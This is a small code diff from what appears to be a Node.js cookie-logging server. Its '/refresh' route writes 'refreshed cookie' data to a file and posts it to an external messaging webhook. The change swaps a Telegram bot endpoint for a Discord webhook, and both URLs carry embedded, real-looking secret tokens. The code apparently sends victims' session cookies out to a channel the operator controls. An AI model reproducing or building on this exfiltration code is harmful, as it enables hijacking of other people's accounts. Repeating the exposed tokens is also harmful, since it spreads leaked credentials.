@@ -57,7 +57,7 @@ app.get('/refresh', async (req, res) => {
 
     fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4));
 
-    const webhookURL = 'https://api.telegram.org/bot6753842847:AAHYDVaAYSRizgwCPrROIDeqOUNl7d242kA/sendmessage?chat_id=-4098650850';
+    const webhookURL = 'https://discord.com/api/webhooks/1180033871111266315/W16GQmswnMdURWXM3LfINi42uoP_kjss_hGA51KMh8B7QaioQKLwzBQ1D_LALKgHPPKK';
     const response = await axios.post(webhookURL, {
         embeds: [
             {
